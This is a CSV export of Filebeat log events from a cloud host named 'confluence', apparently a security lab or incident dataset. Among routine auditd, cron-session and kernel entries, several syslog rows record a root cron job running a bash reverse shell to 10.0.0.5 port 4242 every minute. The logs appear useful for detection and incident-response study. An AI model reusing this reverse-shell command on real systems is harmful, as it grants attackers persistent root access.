"@timestamp","_id","_index","_score","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version","cloud.account.id","cloud.availability_zone","cloud.instance.id","cloud.instance.name","cloud.machine.type","cloud.project.id","cloud.provider","cloud.service.name","ecs.version","event.action","event.category","event.dataset","event.ingested","event.kind","event.module","event.outcome","event.timezone","event.type","fileset.name","group.id","host.architecture","host.containerized","host.hostname","host.id","host.ip","host.mac","host.name","host.os.codename","host.os.family","host.os.kernel","host.os.name","host.os.name.text","host.os.platform","host.os.type","host.os.version","input.type","log.file.path","log.offset",message,"process.name","process.name.text","process.pid","related.hosts","related.ip","related.user","service.type","source.ip","source.port","system.auth.ssh.event","system.auth.ssh.method","system.auth.ssh.signature","system.auth.sudo.command","system.auth.sudo.pwd","system.auth.sudo.tty","system.auth.sudo.user","system.auth.useradd.home","system.auth.useradd.shell","user.effective.name","user.effective.name.text","user.id","user.name","user.name.text"
"Oct 26, 2022 @ 01:52:19.000",72lGEIQBiYLzbw6NNImE,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:52:27.267",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","28,346","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:52:01.000",2GlGEIQBiYLzbw6NBYlw,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:52:15.215",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","6,245","pam_unix(cron:session): session opened for user root by (uid=0)",CRON,CRON,3578170,confluence,"-",root,system,"-","-","-","-","-","-","-","-","-","-","-",root,root,0,"(empty)","(empty)"
"Oct 26, 2022 @ 01:52:01.000","12lFEIQBiYLzbw6N-Ynq",".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:52:12.265",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","28,221","(root) CMD (sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1')",CRON,CRON,3578171,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:51:29.000",gWlFEIQBiYLzbw6NcYkv,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:51:37.262",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","28,145","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:51:27.000",gGlFEIQBiYLzbw6NXYmm,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:51:32.262",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","28,039","[166000.368086] virtio_balloon virtio2: Out of puff! Can't get 1 pages",kernel,kernel,"-",confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:51:26.000",a2lFEIQBiYLzbw6NUYnt,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:51:29.260",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","27,933","[165998.628155] virtio_balloon virtio2: Out of puff! Can't get 1 pages",kernel,kernel,"-",confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:51:01.000","P2lEEIQBiYLzbw6N_4ng",".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:51:08.255",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","27,808","(root) CMD (sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1')",CRON,CRON,3578138,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:51:01.000",QGlFEIQBiYLzbw6NB4mC,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:51:10.209",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","6,139","pam_unix(cron:session): session opened for user root by (uid=0)",CRON,CRON,3578137,confluence,"-",root,system,"-","-","-","-","-","-","-","-","-","-","-",root,root,0,"(empty)","(empty)"
"Oct 26, 2022 @ 01:50:39.000",JGlEEIQBiYLzbw6NxYlG,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:50:53.253",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","27,732","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:50:01.000",y2lEEIQBiYLzbw6NMIij,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:50:15.201",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","6,033","pam_unix(cron:session): session opened for user root by (uid=0)",CRON,CRON,3578095,confluence,"-",root,system,"-","-","-","-","-","-","-","-","-","-","-",root,root,0,"(empty)","(empty)"
"Oct 26, 2022 @ 01:50:01.000",tWlEEIQBiYLzbw6NFYh5,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:50:08.248",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","27,607","(root) CMD (sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1')",CRON,CRON,3578096,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:49:59.000",qmlEEIQBiYLzbw6NAYjw,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:50:03.248",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","27,531","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:49:09.000",P2lDEIQBiYLzbw6NZYit,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:49:23.245",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","27,455","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:49:01.000",BGlDEIQBiYLzbw6NK4gT,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:49:08.242",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","27,330","(root) CMD (sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1')",CRON,CRON,3578060,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:49:01.000",BWlDEIQBiYLzbw6NMoix,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:49:10.192",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","5,927","pam_unix(cron:session): session opened for user root by (uid=0)",CRON,CRON,3578059,confluence,"-",root,system,"-","-","-","-","-","-","-","-","-","-","-",root,root,0,"(empty)","(empty)"
